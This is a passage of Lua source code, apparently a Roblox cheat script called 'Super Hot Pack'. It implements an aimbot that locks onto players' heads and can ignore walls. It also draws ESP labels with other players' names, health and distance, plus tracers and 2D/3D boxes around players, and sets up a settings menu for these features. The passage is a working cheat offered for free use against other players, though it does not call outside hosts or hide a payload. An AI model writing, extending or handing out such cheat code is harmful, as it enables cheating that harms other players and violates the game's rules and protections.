                    -- getClosestTarget({mode = "mouse"}) later
                    target, _, closestplr = utility.getClosestMouseTarget({
                        ignoreteam = aimbot.ignoreteam;
                        ignorewalls = aimbot.ignorewalls;
                        maxobscuringparts = aimbot.maxobscuringparts;
                        name = 'Head';
                        fov = aimbot.fovsize;
                        checkifalive = aimbot.checkifalive;
                    })
                end
            end
        else
            target = utility.getClosestMouseTarget({
                ignoreteam = aimbot.ignoreteam;
                ignorewalls = aimbot.ignorewalls;
                maxobscuringparts = aimbot.maxobscuringparts;
                name = 'Head';
                fov = aimbot.fovsize;
                checkifalive = aimbot.checkifalive;
            })
        end

        if target then
            aimAt(target:GetRenderCFrame().Position)
            -- hot or not?
        end
    end

    function aimbot:End()
        completeStop = true
        target = nil
    end
end


-- Mostly visuals below here
local clearDrawn, newdrawing
do
    --/ Drawing extra functions

    local insert = table.insert
    local newd = drawing.new

    local drawn = {}
    function clearDrawn() -- who doesnt love drawing library
        for i,v in pairs(drawn) do
            pcall(function() v:Remove() end)
            drawn[i] = nil
        end
        drawn = {}
    end

    function newdrawing(class, props)
        --if visuals.enabled ~= true then
        --    return
        --end
        local new = newd(class)
        for i,v in pairs(props) do
            new[i] = v
        end
        insert(drawn, new)
        return new
    end
end


do
    --/ Crosshair
    local crosshair_settings = {}
    crosshair_settings.enabled = settings:Get("crosshair.enabled", false)
    crosshair_settings.size = settings:Get("crosshair.size", 40)
    crosshair_settings.thickness = settings:Get("crosshair.thickness", 1)
    crosshair_settings.color = Color3.fromRGB(255,0,0)
    crosshair_settings.transparency = settings:Get("crosshair.transparency", .1)

    setmetatable(crosshair, { -- yes I know it is easier ways to add this but that requires effort
        __index = function(self, index)
            if crosshair_settings[index] ~= nil then
                local Value = crosshair_settings[index]
                if typeof(Value) == "table" then
                    return typeof(Value) == "table" and Value.Value
                else
                    return Value
                end
            end
            warn(("AH8_ERROR : CrosshairSettings : Tried to index %s"):format(tostring(index)))
        end;
        __newindex = function(self, index, value)
            if typeof(value) ~= "function" then
                if crosshair_settings[index] then
                    local v = crosshair_settings[index]
                    if typeof(v) ~= "table" then
                        crosshair_settings[index] = value
                        return
                    elseif v.Set then
                        v:Set(value)
                        return
                    end
                end
            end
            rawset(self, index, value)
        end;
    })

    local crossHor
    local crossVer
    local vpSize = camera.ViewportSize



    local completeStop = false
    local function drawCrosshair()
        if completeStop then return crosshair:Remove() end
        if crossHor ~= nil or crossVer ~= nil then
            return
        end

        local self = {
            Visible = true;
            Transparency = (1 - crosshair.transparency);
            Thickness = crosshair.thickness;
            Color = crosshair.color;
        }

        if crosshair.enabled ~= true then
            self.Visible = false
        end
        local h,v = newdrawing("Line", self), newdrawing("Line", self)

        if self.Visible then
            local vpSize = camera.ViewportSize/2
            local size = crosshair.size/2
            local x,y = vpSize.X, vpSize.Y

            h.From = v2new(x - size, y)
            h.To = v2new(x + size, y)
            
            v.From = v2new(x, y - size)
            v.To = v2new(x, y + size)
        end

        crossHor = h
        crossVer = v
    end

    local function updateCrosshair() -- no reason at all to update this each frame
        -- I will replace with ViewportSize.Changed later
        if completeStop then return end

        if crossHor == nil or crossVer == nil then
            return drawCrosshair()
        end

        local visible = crosshair.enabled

        crossHor.Visible = visible
        crossVer.Visible = visible

        if visible then
            local vpSize = camera.ViewportSize / 2
            local size = crosshair.size/2
            local x,y = vpSize.X, vpSize.Y

            local color = crosshair.color
            crossHor.Color = color
            crossVer.Color = color
            
            local trans = (1 - crosshair.transparency)
            crossHor.Transparency = trans
            crossVer.Transparency = trans

            local thick = crosshair.thickness
            crossHor.Thickness = thick
            crossVer.Thickness = thick

            crossHor.From = v2new(x - size, y)
            crossHor.To = v2new(x + size, y)
        
            crossVer.From = v2new(x, y - size)
            crossVer.To = v2new(x, y + size)
        end
    end

    function crosshair:Remove()
        if crossHor ~= nil then
            crossHor:Remove()
            crossHor = nil
        end
        if crossVer ~= nil then
            crossVer:Remove()
            crossVer = nil
        end
    end

    function crosshair:End()
        completeStop = true
        if crossHor ~= nil then
            crossHor:Remove()
            crossHor = nil
        end
        if crossVer ~= nil then
            crossVer:Remove()
            crossVer = nil
        end
        crosshair.enabled = false
    end

    crosshair.step = updateCrosshair
    --function crosshair.step()
    --    updateCrosshair()        
    --end
end


do
    --/ Tracers

    local tracers_settings = {}
    tracers_settings.enabled = settings:Get("tracers.enabled", true)
    tracers_settings.origin = v2new(camera.ViewportSize.X/2, camera.ViewportSize.Y)
    tracers_settings.frommouse = settings:Get("tracers.frommouse", true)
    tracers_settings.transparency = .6
    tracers_settings.thickness = 1.5
    tracers_settings.showteam = settings:Get("tracers.showteam", true)

    tracers_settings.drawdistance = settings:Get("tracers.drawdistance", 4000)
    tracers_settings.showvisible = settings:Get("tracers.showvisible", true)

    tracers_settings.enemycolor = Color3.fromRGB(255,7,58) -- 238,38,37, 255,0,13, 255,7,58
    tracers_settings.teamcolor = Color3.fromRGB(121,255,97) -- 121,255,97, 57,255,20
    tracers_settings.visiblecolor = Color3.fromRGB(0, 141, 255)

    setmetatable(tracers, {
        __index = function(self, index)
            if tracers_settings[index] ~= nil then
                local Value = tracers_settings[index]
                if typeof(Value) == "table" then
                    return typeof(Value) == "table" and Value.Value
                else
                    return Value
                end
            end
            warn(("AH8_ERROR : TracersSettings : Tried to index %s"):format(tostring(index)))
        end;
        __newindex = function(self, index, value)
            if typeof(value) ~= "function" then
                if tracers_settings[index] then
                    local v = tracers_settings[index]
                    if typeof(v) ~= "table" then
                        tracers_settings[index] = value
                        return
                    elseif v.Set then
                        v:Set(value)
                        return
                    end
                end
            end
            rawset(self, index, value)
        end;
    })

    local worldToViewportPoint = camera.WorldToViewportPoint

    local completeStop = false
    local drawn = {}

    local function drawTemplate(player)
        if completeStop then return end

        if drawn[player] then
            return drawn[player]
           --tracers:Remove(player)
        end


        local a = newdrawing("Line", {
            Color = tracers.enemycolor;
            Thickness = tracers.thickness;
            Transparency = 1 - tracers.transparency;
            Visible = false;
        })
        drawn[player] = a
        return a
    end

    function tracers:Draw(player, character, root, humanoid, onscreen, isteam, dist, screenpos)
        if completeStop then return end

        if tracers.enabled ~= true then return tracers:Remove(player) end
        if character == nil then return tracers:Remove(player) end

        if tracers.showteam~=true and isteam then return tracers:Remove(player) end

        if root == nil then return tracers:Remove(player) end

        if dist then
            if dist > tracers.drawdistance then
                return tracers:Remove(player)
            end
        end

        local screenpos = worldToViewportPoint(camera, root.Position)

        local line
        if drawn[player] ~= nil then
            line = drawn[player]
        elseif onscreen then
            line = drawTemplate(player)
        end
        if line then
            if onscreen then
                line.From = tracers.origin
                line.To = v2new(screenpos.X, screenpos.Y)
        
                local color
                if isteam == false and tracers.showvisible then
                    if utility.isvisible(character, root, 0) then
                        color = tracers.visiblecolor
                    else
                        color = isteam and tracers.teamcolor or tracers.enemycolor
                    end
                else
                    color = isteam and tracers.teamcolor or tracers.enemycolor
                end

                line.Color = color
            end
            line.Visible = onscreen
        end
        --return line
    end

    function tracers:Hide(player)
        if completeStop then return end

        local line = drawn[player]
        if line then
            line.Visible = false
        end
    end

    function tracers:Remove(player)
        if drawn[player] ~= nil then
            drawn[player]:Remove()
            drawn[player] = nil
        end
    end

    function tracers:RemoveAll()
        for i,v in pairs(drawn) do
            pcall(function()
                v:Remove()
            end)
            drawn[i] = nil
        end
        drawn = {}
    end
    function tracers:End()
        completeStop = true
        for i,v in pairs(drawn) do
            pcall(function()
                v:Remove()
            end)
            drawn[i] = nil
        end
        drawn = {}
    end
end

do
    --/ ESP
    local esp_settings = {}

    esp_settings.enabled = settings:Get("esp.enabled", true)
    esp_settings.showteam = settings:Get("esp.showteam", true)
    
    esp_settings.teamcolor = Color3.fromRGB(57,255,20) -- 121,255,97, 57,255,20
    esp_settings.enemycolor = Color3.fromRGB(255,7,58) -- 238,38,37, 255,0,13, 255,7,58
    esp_settings.visiblecolor = Color3.fromRGB(0, 141, 255) -- 0, 141, 255


    esp_settings.size = settings:Get("esp.size", 16)
    esp_settings.centertext = settings:Get("esp.centertext", true)
    esp_settings.outline = settings:Get("esp.outline", true)
    esp_settings.transparency = settings:Get("esp.transparency", 0.1)

    esp_settings.drawdistance = settings:Get("esp.drawdistance", 1500)


    esp_settings.showvisible = settings:Get("esp.showvisible", true)

    esp_settings.yoffset = settings:Get("esp.yoffset", 0)

    esp_settings.showhealth = settings:Get("esp.showhealth", true)
    esp_settings.showdistance = settings:Get("esp.showdistance", true)


    setmetatable(esp, {
        __index = function(self, index)
            if esp_settings[index] ~= nil then
                local Value = esp_settings[index]
                if typeof(Value) == "table" then
                    return typeof(Value) == "table" and Value.Value
                else
                    return Value
                end
            end
            warn(("AH8_ERROR : EspSettings : Tried to index %s"):format(tostring(index)))
        end;
        __newindex = function(self, index, value)
            if typeof(value) ~= "function" then
                if esp_settings[index] then
                    local v = esp_settings[index]
                    if typeof(v) ~= "table" then
                        esp_settings[index] = value
                        return
                    elseif v.Set then
                        v:Set(value)
                        return
                    end
                end
            end
            rawset(self, index, value)
        end;
    })

    local unpack = unpack
    local findFirstChild = Instance.new("Part").FindFirstChild
    local worldToViewportPoint = camera.WorldToViewportPoint
    local getBoundingBox = Instance.new("Model").GetBoundingBox
    local getExtentsSize = Instance.new("Model").GetExtentsSize

    local floor = math.floor
    local insert = table.insert
    local concat = table.concat

    local drawn = {}
    local completeStop = false

    local function drawTemplate(player)
        if completeStop then return end
        if drawn[player] then return drawn[player] end

        local obj = newdrawing("Text", {
            Text = "n/a",
            Size = esp.size,
            Color = esp.enemycolor,
            Center = esp.centertext,
            Outline = esp.outline,
            Transparency = (1 - esp.transparency),
        })
        return obj
    end

    function esp:Draw(player, character, root, humanoid, onscreen, isteam, dist)
        if completeStop then return end
        if character == nil then return esp:Remove(player) end
        if root == nil then return esp:Remove(player) end
        if esp.showteam~=true and isteam then return esp:Remove(player) end

        if dist then
            if dist > esp.drawdistance then
                return esp:Remove(player)
            end
        end

        local where, isvis = worldToViewportPoint(camera, (root.CFrame * esp.offset).p);
        --if not isvis then return esp:Remove(player) end


        local oesp = drawn[player]
        if oesp == nil then
            oesp = drawTemplate(player)
            drawn[player] = oesp
        end
        
        if oesp then
            oesp.Visible = isvis
            if isvis then
                oesp.Position = v2new(where.X, where.Y)

                local color
                if isteam == false and esp.showvisible then
                    if utility.isvisible(character, root, 0) then
                        color = esp.visiblecolor
                    else
                        color = isteam and esp.teamcolor or esp.enemycolor
                    end
                else
                    color = isteam and esp.teamcolor or esp.enemycolor
                end

                oesp.Color = color

                oesp.Center = esp.centertext
                oesp.Size = esp.size
                oesp.Outline = esp.outline
                oesp.Transparency = (1 - esp.transparency)

                local texts = {
                    player.Name,
                }
                
                local b = humanoid and esp.showhealth and ("%s/%s"):format(floor(humanoid.Health + .5), floor(humanoid.MaxHealth + .5))
                if b then
                    insert(texts, b)
                end
                local c = dist and esp.showdistance and ("%s"):format(floor(dist + .5))
                if c then
                    insert(texts, c)
                end

                local text = "[  " .. concat(texts, " | ") .. " ]"
                oesp.Text = text
            end
        end
    end

    function esp:Remove(player)
        local data = drawn[player]
        if data ~= nil then
            data:Remove()
            drawn[player] = nil
        end
    end

    function esp:RemoveAll()
        for i,v in pairs(drawn) do
            pcall(function() v:Remove() end)
            drawn[i] = nil
        end
    end

    function esp:End()
        completeStop = true
        esp:RemoveAll()
    end
end


do
    --/ Boxes

    local boxes_settings = {}
    boxes_settings.enabled = settings:Get("boxes.enabled", false)
    boxes_settings.transparency = settings:Get("boxes.transparency", .2)
    boxes_settings.thickness = settings:Get("boxes.thickness", 1.5)
    boxes_settings.showteam = settings:Get("boxes.showteam", true)

    boxes_settings.teamcolor = Color3.fromRGB(57,255,20) -- 121,255,97,  57,255,20
    boxes_settings.enemycolor = Color3.fromRGB(255,7,58) -- 238,38,37, 255,0,13, 255,7,58
    boxes_settings.visiblecolor = Color3.fromRGB(0, 141, 255)

    boxes_settings.thirddimension = settings:Get("boxes.thirddimension", false)

    boxes_settings.showvisible = settings:Get("boxes.showvisible", true)

    boxes_settings.dist3d = settings:Get("boxes.dist3d", 1000)
    boxes_settings.drawdistance = settings:Get("boxes.drawdistance", 4000)
    boxes_settings.color = Color3.fromRGB(255, 50, 50)

    setmetatable(boxes, {
        __index = function(self, index)
            if boxes_settings[index] ~= nil then
                local Value = boxes_settings[index]
                if typeof(Value) == "table" then
                    return typeof(Value) == "table" and Value.Value
                else
                    return Value
                end
            end
            warn(("AH8_ERROR : BoxesSettings : Tried to index %s"):format(tostring(index)))
        end;
        __newindex = function(self, index, value)
            if typeof(value) ~= "function" then
                if boxes_settings[index] then
                    local v = boxes_settings[index]
                    if typeof(v) ~= "table" then
                        boxes_settings[index] = value
                        return
                    elseif v.Set then
                        v:Set(value)
                        return
                    end
                end
            end
            rawset(self, index, value)
        end;
    })

    local unpack = unpack
    local findFirstChild = Instance.new("Part").FindFirstChild
    local worldToViewportPoint = camera.WorldToViewportPoint
    local worldToScreenPoint = camera.WorldToScreenPoint
    local getBoundingBox = Instance.new("Model").GetBoundingBox
    local getExtentsSize = Instance.new("Model").GetExtentsSize

    local completeStop = false
    local drawn = {}
    local function drawTemplate(player, amount)
        if completeStop then return end

        if drawn[player] then
            if #drawn[player] == amount then
                return drawn[player]
            end
            boxes:Remove(player)
        end

        local props = {
            Visible = true;
            Transparency = 1 - boxes.transparency;
            Thickness = boxes.thickness;
            Color = boxes.color;
        }

        local a = {}
        for i = 1,amount or 4 do
            a[i] = newdrawing("Line", props)
        end

        drawn[player] = {unpack(a)}
        return unpack(a)
    end

    local function updateLine(line, from, to, vis, color)
        if line == nil then return end

        line.Visible = vis
        if vis then
            line.From = from
            line.To = to
            line.Color = color
        end
    end

    function boxes:Draw(player, character, root, humanoid, onscreen, isteam, dist) -- No skid plox
        if completeStop then return end
        if character == nil then return boxes:Remove(player) end
        if root == nil then return boxes:Remove(player) end
        if not onscreen then return boxes:Remove(player) end
        if boxes.showteam == false and isteam then return boxes:Remove(player) end

        local _3dimension = boxes.thirddimension
        if dist ~= nil then
            if dist > boxes.drawdistance then
                return boxes:Remove(player)
            elseif _3dimension and dist > boxes.dist3d then
                _3dimension = false
            end
        end

        local color
        if isteam == false and boxes.showvisible then
            if utility.isvisible(character, root, 0) then
                color = boxes.visiblecolor
            else
                color = isteam and boxes.teamcolor or boxes.enemycolor
            end
        else
            color = isteam and boxes.teamcolor or boxes.enemycolor
        end

        --size = ... lastsize--, v3new(5,8,0) --getBoundingBox(character)--]] root.CFrame, getExtentsSize(character)--]] -- Might change this later idk + idc
        if _3dimension then

            local tlb, trb, blb, brb, tlf, trf, blf, brf, tlf0, trf0, blf0, brf0
            if drawn[player] == nil or #drawn[player] ~= 12 then
                tlb, trb, blb, brb, tlf, trf ,blf, brf, tlf0, trf0, blf0, brf0 = drawTemplate(player, 12)
            else
                tlb, trb, blb, brb, tlf, trf ,blf, brf, tlf0, trf0, blf0, brf0 = unpack(drawn[player])
            end

            local pos, size = root.CFrame, root.Size--lastsize--, v3new(5,8,0)

            local topleftback, topleftbackvisible = worldToViewportPoint(camera, (pos * cfnew(-size.X, size.Y, size.Z)).p);
            local toprightback, toprightbackvisible = worldToViewportPoint(camera, (pos * cfnew(size.X, size.Y, size.Z)).p);
            local btmleftback, btmleftbackvisible = worldToViewportPoint(camera, (pos * cfnew(-size.X, -size.Y, size.Z)).p);
            local btmrightback, btmrightbackvisible = worldToViewportPoint(camera, (pos * cfnew(size.X, -size.Y, size.Z)).p);

            local topleftfront, topleftfrontvisible = worldToViewportPoint(camera, (pos * cfnew(-size.X, size.Y, -size.Z)).p);
            local toprightfront, toprightfrontvisible = worldToViewportPoint(camera, (pos * cfnew(size.X, size.Y, -size.Z)).p);
            local btmleftfront, btmleftfrontvisible = worldToViewportPoint(camera, (pos * cfnew(-size.X, -size.Y, -size.Z)).p);
            local btmrightfront, btmrightfrontvisible = worldToViewportPoint(camera, (pos * cfnew(size.X, -size.Y, -size.Z)).p);

            local topleftback = v2new(topleftback.X, topleftback.Y)
            local toprightback = v2new(toprightback.X, toprightback.Y)
            local btmleftback = v2new(btmleftback.X, btmleftback.Y)
            local btmrightback = v2new(btmrightback.X, btmrightback.Y)

            local topleftfront = v2new(topleftfront.X, topleftfront.Y)
            local toprightfront = v2new(toprightfront.X, toprightfront.Y)
            local btmleftfront = v2new(btmleftfront.X, btmleftfront.Y)
            local btmrightfront = v2new(btmrightfront.X, btmrightfront.Y)

            -- pls don't copy this bad code
			updateLine(tlb, topleftback, toprightback, topleftbackvisible, color)
            updateLine(trb, toprightback, btmrightback, toprightbackvisible, color)
            updateLine(blb, btmleftback, topleftback, btmleftbackvisible, color)
            updateLine(brb, btmleftback, btmrightback, btmrightbackvisible, color)

            --

            updateLine(brf, btmrightfront, btmleftfront, btmrightfrontvisible, color)
            updateLine(tlf, topleftfront, toprightfront, topleftfrontvisible, color)
            updateLine(trf, toprightfront, btmrightfront, toprightfrontvisible, color)
            updateLine(blf, btmleftfront, topleftfront, btmleftfrontvisible, color)

            --

            updateLine(brf0, btmrightfront, btmrightback, btmrightfrontvisible, color)
            updateLine(tlf0, topleftfront, topleftback, topleftfrontvisible, color)
            updateLine(trf0, toprightfront, toprightback, toprightfrontvisible, color)
            updateLine(blf0, btmleftfront, btmleftback, btmleftfrontvisible, color)
            return
        else

            local tl, tr, bl, br
            if drawn[player] == nil or #drawn[player] ~= 4 then
                tl, tr, bl, br = drawTemplate(player, 4)
            else
                tl, tr, bl, br = unpack(drawn[player])
            end

            local pos, size = root.CFrame, root.Size

            local topleft, topleftvisible = worldToViewportPoint(camera, (pos * cfnew(-size.X, size.Y, 0)).p);
            local topright, toprightvisible = worldToViewportPoint(camera, (pos * cfnew(size.X, size.Y, 0)).p);
            local btmleft, btmleftvisible = worldToViewportPoint(camera, (pos * cfnew(-size.X, -size.Y, 0)).p);
            local btmright, btmrightvisible = worldToViewportPoint(camera, (pos * cfnew(size.X, -size.Y, 0)).p);

            local topleft = v2new(topleft.X, topleft.Y)
            local topright = v2new(topright.X, topright.Y)
            local btmleft = v2new(btmleft.X, btmleft.Y)
            local btmright = v2new(btmright.X, btmright.Y)

            updateLine(tl, topleft, topright, topleftvisible, color)
            updateLine(tr, topright, btmright, toprightvisible, color)
            updateLine(bl, btmleft, topleft, btmleftvisible, color)
            updateLine(br, btmleft, btmright, btmrightvisible, color)
            return
        end


        -- I have never been more bored when doing 3d boxes.
    end

    function boxes:Remove(player)
        local data = drawn[player]
        if data == nil then return end

        if data then
            for i,v in pairs(data) do
                v:Remove()
                data[i] = nil
            end
        end
        drawn[player] = nil
    end

    function boxes:RemoveAll()
        for i,v in pairs(drawn) do
            pcall(function()
                for i2,v2 in pairs(v) do
                    v2:Remove()
                    v[i] = nil
                end
            end)
            drawn[i] = nil
        end
        drawn = {}
    end

    function boxes:End()
        completeStop = true
        for i,v in pairs(drawn) do
            for i2,v2 in pairs(v) do
                pcall(function()
                    v2:Remove()
                    v[i2] = nil
                end)
            end
            drawn[i] = nil
        end
        drawn = {}
    end
end


do
    --/ Visuals

    visuals.enabled = settings:Get("visuals.enabled", true)

    local getPlayers = players.GetPlayers

    local credits
    local circle

    local completeStop = false
    bindEvent(players.PlayerRemoving, function(p)
        if completeStop then return end
        tracers:Remove(p)
        boxes:Remove(p)
        esp:Remove(p)
    end)

    local profilebegin = DEBUG_MODE and debug.profilebegin or function() end
    local profileend = DEBUG_MODE and debug.profileend or function() end


    local unpack = unpack
    local findFirstChild = Instance.new("Part").FindFirstChild
    local worldToViewportPoint = camera.WorldToViewportPoint

    local function remove(p)
        esp:Remove(p)
        boxes:Remove(p)
        tracers:Remove(p)
    end

    local hashes = {}
    function visuals.step()
        --if visuals.enabled ~= true then return clearDrawn() end
        if completeStop then return end


        local viewportsize = camera.ViewportSize
        if credits == nil then
            credits = newdrawing("Text", {
                Text = "Super Hot Pack"; -- yes now be happy this is free
                Color = Color3.new(0,255,0);
                Size = 25.0;
                Transparency = .8;
                Position = v2new(viewportsize.X/8, 6);
                Outline = true;
                Visible = true;
            })
        else
            credits.Position = v2new(viewportsize.X/8, 6);
        end

        if aimbot.enabled and aimbot.fovenabled and visuals.enabled then
            profilebegin("fov.step")
            if circle == nil then
                circle = newdrawing("Circle", {
                    Position = v2new(mouse.X, mouse.Y+36),
                    Radius = aimbot.fovsize,
                    Color = Color3.fromRGB(240,240,240),
                    Thickness = aimbot.fovthickness,
                    Filled = false,
                    Transparency = .8,
                    NumSides = aimbot.fovsides,
                    Visible = aimbot.fovshow;
                })
            else
                if aimbot.fovshow then                    
                    circle.Position = v2new(mouse.X, mouse.Y+36)
                    circle.Radius = aimbot.fovsize
                    circle.NumSides = aimbot.fovsides
                    circle.Thickness = aimbot.fovthickness
                end
                circle.Visible = aimbot.fovshow
            end
            profileend("fov.step")
        elseif circle ~= nil then
            circle:Remove()
            circle = nil
        end

        if visuals.enabled and crosshair.enabled then
            profilebegin("crosshair.step")
            crosshair.step()
            profileend("crosshair.step")
        else
            crosshair:Remove()
        end

        if visuals.enabled and (esp.enabled or boxes.enabled or tracers.enabled) then
            profilebegin("tracers.origin")
            if tracers.frommouse then 
                tracers.origin = v2new(mouse.X, mouse.Y+36) -- thanks roblox
            else
                tracers.origin = v2new(viewportsize.X/2, viewportsize.Y)
            end
            profileend("tracers.origin")

            if esp.enabled then
                esp.offset = cfnew(0, esp.yoffset, 0)
            end

            for i,v in pairs(getPlayers(players)) do
                if (v~=locpl) then
                    local character = utility.getcharacter(v)
                    if character and isDescendantOf(character, game) == true then
                        local root = utility.getroot(character)
                        local humanoid = findFirstChildOfClass(character, "Humanoid")
                        if root and isDescendantOf(character, game) == true then
                            local screenpos, onscreen = worldToViewportPoint(camera, root.Position)
                            local dist = utility.myroot and (utility.myroot.Position - root.Position).Magnitude
                            local isteam = (v.Team~=nil and v.Team==locpl.Team) and not v.Neutral or false

                            if boxes.enabled then -- Profilebegin is life
                                profilebegin("boxes.draw")
                                boxes:Draw(v, character, root, humanoid, onscreen, isteam, dist)
                                profileend("boxes.draw")
                            else
                                boxes:Remove(v)
                            end
                            if tracers.enabled then
                                profilebegin("tracers.draw")
                                tracers:Draw(v, character, root, humanoid, onscreen, isteam, dist, screenpos)
                                profileend("tracers.draw")
                            else
                                tracers:Remove(v)
                            end
        
                            if esp.enabled then
                                profilebegin("esp.draw")
                                esp:Draw(v, character, root, humanoid, onscreen, isteam, dist)
                                profileend("esp.draw")
                            else
                                esp:Remove(v)
                            end
                        else
                            remove(v)
                        end
                    else
                        remove(v)
                    end
                end
            end
        else
            -- mhm
            tracers:RemoveAll()
            boxes:RemoveAll()
            esp:RemoveAll()
            crosshair:Remove()
        end
    end

    function visuals:End()
        completeStop = true
        crosshair:End()
        boxes:End()
        tracers:End()
        esp:End()

        clearDrawn()
    end

    spawn(function()
        while ah8 and ah8.enabled do -- I dont know why I am doing this
            for i,v in pairs(hashes) do
                hashes[i] = nil
                wait()
            end
            wait(3)
        end
    end)
end



-- Ok yes
do
    --/ Run

    local pcall = pcall;
    local tostring = tostring;
    local warn = warn;
    local debug = debug;
    local profilebegin = DEBUG_MODE and debug.profilebegin or function() end
    local profileend = DEBUG_MODE and debug.profileend or function() end

    local renderstep = runservice.RenderStepped
    local heartbeat = runservice.Heartbeat
    local stepped = runservice.Stepped
    local wait = renderstep.wait

    local function Warn(a, ...) -- ok frosty get to bed
        warn(tostring(a):format(...))
    end
    
    run.dt = 0
    run.time = tick()

    local engine = {
        {
            name = 'visuals.step',
            func = visuals.step
        };
    }
    local heartengine = {
        {
            name = 'aimbot.step',
            func = aimbot.step
        };
    }
    local whilerender = {
    }

    run.onstep = {}
    run.onthink = {}
    run.onrender = {}
    function run.wait()
        wait(renderstep)
    end

    local fireonstep = event.new(run.onstep)
    local fireonthink = event.new(run.onthink)
    local fireonrender = event.new(run.onrender)

    local rstname = "AH.Renderstep"
    bindEvent(renderstep, function(delta)
        profilebegin(rstname)
        local ntime = tick()
        run.dt = ntime - run.time
        run.time = ntime

        for i,v in pairs(engine) do

            profilebegin(v.name)
            xpcall(v.func, function(err)
                if (DEBUG_MODE == true) then
                    Warn("AH8_ERROR (RENDERSTEPPED) : Failed to run %s! %s | %s", v.name, tostring(err), debug.traceback())
                end
                engine[i] = nil
            end, run.dt)
            profileend(v.name)

        end

        profileend(rstname)
    end)

    local hbtname = "AH.Heartbeat"
    bindEvent(heartbeat, function(delta)
        profilebegin(hbtname)

        for i,v in pairs(heartengine) do

            profilebegin(v.name)
            xpcall(v.func, function(err)
                if (DEBUG_MODE == true) then
                    Warn("AH8_ERROR (HEARTBEAT) : Failed to run %s! %s | %s", v.name, tostring(err), debug.traceback())
                end
                heartengine[i] = nil
            end, delta)
            profileend(v.name)

        end

        profileend(hbtname)
    end)

    local stpname = "AH.Stepped"
    bindEvent(stepped, function(delta)
        
        profilebegin(stpname)

        for i,v in pairs(whilerender) do

            profilebegin(v.name)
            xpcall(v.func, function(err)
                if (DEBUG_MODE == true) then
                    Warn("AH8_ERROR (STEPPED) : Failed to run %s! %s | %s", v.name, tostring(err), debug.traceback())
                end
                heartengine[i] = nil
            end, delta)
            profileend(v.name)

        end

        profileend(stpname)
    end)
end

do
    --/ Main or something I am not sure what I am writing anymore
    settings:Save()

    ah8.enabled = true
    function ah8:close()
        spawn(function() pcall(visuals.End, visuals) end)
        spawn(function() pcall(aimbot.End, aimbot) end)
        spawn(function() pcall(hud.End, hud) end)
        spawn(function()
            for i,v in pairs(connections) do
                pcall(function() v:Disconnect() end)
            end
        end)
        ah8 = nil
        shared.ah8 = nil -- k

        settings:Save()
    end

    ah8.visible = hud.Visible
    function ah8:show()
        hud:show()
        ah8.visible = hud.Visible
    end

    function ah8:hide()
        hud:hide()
        ah8.visible = hud.Visible
    end

    setmetatable(ah8, { -- ok safazi be happy now
        __newindex = function(self, index, value)
            if (index == "Keybind") then
                settings:Set("hud.keybind", value)
                hud.Keybind = value
                return
            end
        end;
    })

    shared.ah8 = ah8

    local players = game:GetService("Players")
    local loc = players.LocalPlayer
    bindEvent(players.PlayerRemoving, function(p)
        if p == loc then
            settings:Save()
        end
    end)

end


-- I didn't think this ui lib through
local Aiming = hud:AddTab({
	Text = "Aiming",
})


local AimbotToggle = Aiming:AddToggleCategory({
	Text = "Aimbot",
	State = aimbot.enabled,
}, function(state) 
    aimbot.enabled = state
end)


AimbotToggle:AddKeybind({
	Text = "keybind",
	Current = aimbot.keybind,
}, function(new)
    aimbot.keybind = new.Name 
end)

 
AimbotToggle:AddToggle({
	Text = "Press To Enable",
	State = aimbot.presstoenable,
}, function(state) 
    aimbot.presstoenable = state
end)

AimbotToggle:AddToggle({
	Text = "Lock To Target",
	State = aimbot.locktotarget,
}, function(state) 
    aimbot.locktotarget = state
end)


AimbotToggle:AddToggle({
	Text = "Check If Alive",
	State = aimbot.checkifalive,
}, function(state) 
    aimbot.checkifalive = state
end)

-- settings stuff
local AimbotSettings = Aiming:AddCategory({
	Text = "Settings",
})

AimbotSettings:AddLabel({
    Text = "decrease sens if aimbot is wobbly"
})

AimbotSettings:AddSlider({
    Text = "Sensitivity",
    Current = aimbot.sensitivity
}, {0.01, 10, 0.01}, function(new) 
    aimbot.sensitivity = new
end)

AimbotSettings:AddToggle({
    Text = "Ignore Team",
    State = aimbot.ignoreteam
}, function(new)
    aimbot.ignoreteam = new
end)


AimbotSettings:AddToggle({
    Text = "Ignore Walls",
    State = aimbot.ignorewalls
}, function(new)
    aimbot.ignorewalls = new
end)

AimbotSettings:AddSlider({
    Text = "Max Obscuring Parts",
    Current = aimbot.maxobscuringparts,
}, {0, 50, 1}, function(new)
    aimbot.maxobscuringparts = new
end)



local FieldOfView = Aiming:AddToggleCategory({
    Text = "fov",
    State = aimbot.fovenabled,
}, function(state) 
    aimbot.fovenabled = state
end)

FieldOfView:AddSlider({
    Text = "Radius",
    Current = aimbot.fovsize,
}, {1, 1000, 1}, function(new)
    aimbot.fovsize = new
end)

FieldOfView:AddSlider({
    Text = "Sides",
    Current = aimbot.fovsides,
}, {6, 40, 1}, function(new)
    aimbot.fovsides = new
end)


FieldOfView:AddSlider({
    Text = "Thickness",
    Current = aimbot.fovthickness,
}, {0.1, 50, 0.1}, function(new)
    aimbot.fovthickness = new
end)



local Visuals = hud:AddTab({
    Text = "Visuals"
})

Visuals:AddToggle({
    Text = "Enabled",
    State = visuals.enabled,
}, function(new)
    visuals.enabled = new
end)

local Boxes = Visuals:AddToggleCategory({
    Text = "Boxes",
    State = boxes.enabled,
}, function(new)
    boxes.enabled = new
end)

Boxes:AddToggle({
    Text = "Show Team",
    State = boxes.showteam,
}, function(new)
    boxes.showteam = new
end)

Boxes:AddToggle({
    Text = "Visible check",
    State = boxes.showvisible,
}, function(new)
    boxes.showvisible = new
end)

Boxes:AddSlider({
    Text = "Draw Distance",
    Current = boxes.drawdistance,
}, {100,100000,100}, function(new)
    boxes.drawdistance = new
end)

Boxes:AddToggle({
    Text = "3d",
    State = boxes.thirddimension,
}, function(new)
    boxes.thirddimension = new
end)

Boxes:AddSlider({
    Text = "3d distance",
    Current = boxes.dist3d,
}, {5,10000,5}, function(new)
    boxes.dist3d = new
end)


local Esp = Visuals:AddToggleCategory({
    Text = "Esp",
    State = esp.enabled,
}, function(new)
    esp.enabled = new
end)

Esp:AddToggle({
    Text = "Show Team",
    State = esp.showteam
}, function(new)
    esp.showteam = new
end)

Esp:AddToggle({
    Text = "Visible check",
    State = esp.showvisible,
}, function(new)
    esp.showvisible = new
end)

Esp:AddSlider({
    Text = "Offset",
    Current = esp.yoffset,
}, {-50, 50, 0.01}, function(new)
    esp.yoffset = new
end)

Esp:AddSlider({
    Text = "Transparency",
    Current = esp.transparency
}, {0, 1, 0.01}, function(new)
    esp.transparency = new
end)

Esp:AddSlider({
